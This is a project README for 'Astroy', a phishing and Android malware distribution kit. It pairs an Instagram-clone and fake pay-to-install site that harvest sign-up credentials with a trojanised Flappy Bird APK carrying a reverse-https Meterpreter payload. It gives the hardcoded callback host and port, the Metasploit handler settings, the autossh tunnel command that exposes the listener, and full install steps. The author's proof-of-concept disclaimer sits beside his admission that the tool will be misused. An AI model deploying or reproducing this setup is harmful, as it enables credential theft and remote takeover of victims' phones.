# Astroy

[<img src="https://img.shields.io/badge/Python-3.5%20%7C%203.6%20%7C%203.7-red.svg">]()
[<img src="https://img.shields.io/badge/Requirements-Up%20To%20Date-green.svg">]()
[<img src="https://img.shields.io/badge/Apache-v2.4.38-lightgrey.svg">]()
[<img src="https://img.shields.io/badge/PHP-v7.3.2-orange.svg">]()
[<img src="https://img.shields.io/badge/License-MIT-blue.svg">]()
[<img src="https://img.shields.io/badge/OS-Linux-brightgreen.svg">]()
[<img src="https://img.shields.io/badge/OpenSSH-v7.9-red.svg">]()

> Astroy is a collection of templates that have been outsourced from different projects, combined to launch a powerful, attractive and easy to pull off a two-in-one phishing and Android malware distribution campaign.

[![asciicast](https://asciinema.org/a/fz787azSdbP34fi9iE7dpf0hd.svg)](https://asciinema.org/a/fz787azSdbP34fi9iE7dpf0hd)

I made this as a tool for personal use, and did not think I would come to open-source it. As a result, a LOT of assumptions have been made when coding this, and it's gonna take you a bit of tweaking and playing around with if the OS you're running isn't configured in accordance to how the script wants. Shouldn't be too hard, though.

## Why Astroy?

We live in a generation where, although most people would fall for most get-rich-quick scams, the effort required to social engineer them into actually compromising themselves is tremendous. Astroy sells itself as an ordinary website that pays users to install and use its Android apps, but however gathers user credentials of anyone who signs up to it, and provides a malicious ``APK`` file (a Flappy Bird game laced with a reverse-https payload) to download. If the user installs and runs the malicious game, the attacker will gain a Meterpreter session, effectively pulling off double penetration (no pun intended).

The web templates include a normal sign up page, and an Instagram clone. The reason I did not add more popular templates like Facebook and Google is because their designs weren't as appealing as Instagram's. Special shout out to [thelinuxchoice](https://github.com/thelinuxchoice) for the Instagram phishing template - I modified their version a bit, removed their backend and added mine.

The Flappy Bird game is hardcoded with the LHOST ``serveo.net`` and LPORT ``2345``. On Metasploit, run ``set lhost localhost`` and ``set lport 2345`` to configure the handler. Run ``autossh -tt -M 0 -o 'ServerAliveInterval 30' -o 'ServerAliveCountMax 3' -R 2345:localhost:2345 serveo.net`` to forward TCP connections, and your payload will connect over WAN.

Astroy only serves as a proof of concept to what black hat hackers can achieve if they get creative. I take no responsibility whatsoever for any usage of the tool for any illegal activities by anyone else.

## Assumptions

Because I coded this for personal use, I made this without consideration for other Linux OS'. As such, this tool is made with the assumption that:

1. You're system has Python 3. To set up most of the things that the tool needs, you'll need to run the main python file (``setup.py``) with Python 3. Also, the ``index.php`` files in the directories ``download`` and ``account/instagram`` make calls to Python 3 to run ``retrieve.py`` and ``del.py`` respectively. Depending on how you invoke your Python 3 (for example, I run files like this - ``python3 example.py`` - because my system has two Python versions installed), you might need to alter the default invocation in the ``index.php`` files specified above. Lastly, every Python file in Astroy has a shebang that invokes the Python 3 version installed on my system - this assumes that your Python 3 is located at ``/usr/bin/python3``. Change this line as necessary.

2. Your system has ``Apache2`` and that the default directory for serving web pages is ``/var/www/html``. It also assumes that you have correctly set up ``PHP`` with Apache so that any PHP files are correctly rendered by Apache when its webserver is started. The default Apache webserver listens on port `80`, and this tool abides by that.

3. Your system has ``PHP``. I recommend version ``7``, because I haven't tested this tool with other versions of PHP. 

4. Your system has ``OpenSSH`` and ``AutoSSH``. These are used to establish connections to [Serveo](http://serveo.net), which forwards ports and allows your locally served web pages to be available to the public.

5. You will clone all the main files to ``/var/www/html``, or copy them to that directory. This means that the directories ``account``, ``download``, ``img`` and ``verify``, plus the files ``index.php``, ``requirements.txt`` and ``setup.py`` will all be inside the directory ``/var/www/html``. This is the base directory, where Apache will serve ``index.php`` as the landing page, under the default url ``https://astroy.serveo.net``. The directories ``account``, ``account/instagram``, ``verify`` and ``download`` will all serve their files through PHP servers (either on custom ports or the default ones if none are provided as arguments), and will have the urls ``https://account.serveo.net``, ``https://app.serveo.net``, ``https://verify.serveo.net`` and ``https://download.serveo.net`` respectively. For the sake of avoiding conflict, be sure there are no existing files in ``/var/www/html`` before you copy or download Astroy's files to this directory.

6. It will be totally misused. With the rise of noob hackers and experienced black hats looking for easy scripts for use in their  nefarious activities, this tool is bound to act as an asset for breaking the law. Since [Serveo](http://serveo.net) blocks phishing subdomains as soon as the subdomain is reported, the urls mentioned in ``Assumption 5`` will most likely be blocked after a while - yet they are hardcoded in the PHP files, without any provided means to change them via the command line. The assumption this tool makes is that you'll have to edit each PHP file individually, find any anchor links pointing to the default subdomains and manually change them to the desired subdomains.

7. You are running Linux, as root. I coded this for Kali, but with the right tweaking, it will run on any Linux OS smoothly.

## Pre-requisites

You basically need [``Apache2``](https://www.google.com/amp/s/likegeeks.com/linux-web-server/amp/), [``OpenSSH``](https://www.google.com/amp/s/www.tecmint.com/install-openssh-server-in-linux/amp/), [``PHP``](https://www.tutorialspoint.com/php/php_installation_linux.htm) and [``AutoSSH``](https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-autossh/).

Tap each package to get an idea on how the installation and configuration procedures are like (I couldn't possibly write the entire guide), and it will get you up and running in no time.

Only after you are sure you've got things set up and working correctly should you proceed with the next step.

## Installation

Clone the repository:

```sh
git clone https://github.com/briancanspit/astroy.git
```

Get into the cloned directory:

```sh
cd astroy
```

Copy all the files in the directory to Apache's base directory:

```sh
cp -r * /var/www/html
```

## Setting Things Up

Get into the base directory the script relies on:

```sh
cd /var/www/html
```

You need to change ownership of the files recursively, to give Apache ownership. Run:

```sh
chown -R www-data *
```

Depending on how you invoke Python 3 on your system, run this command to install the requirements needed by Python:

```sh
python3 -m pip install -r requirements.txt
```

Finally, run the setup script. This simply checks whether you have internet, whether the packages it needs are installed, whether you provided any ports as arguments and finally creates an ``astroy`` file at ``/usr/bin/`` which can be run globally from any directory. This setup script can be run without arguments like this:

```sh
python3 setup.py
```

Running it without any arguments makes the script default to using the default ports, which are ``80``, ``3239``, ``8492`` and ``12345``. To provide your own arguments, run the script like this (assume you want the ports to be ``80``, ``444``, ``888`` and ``999``:

```sh
python3 setup.py 80 444 888 999
```

This tool assumes the first command line argument will always be ``80``. 

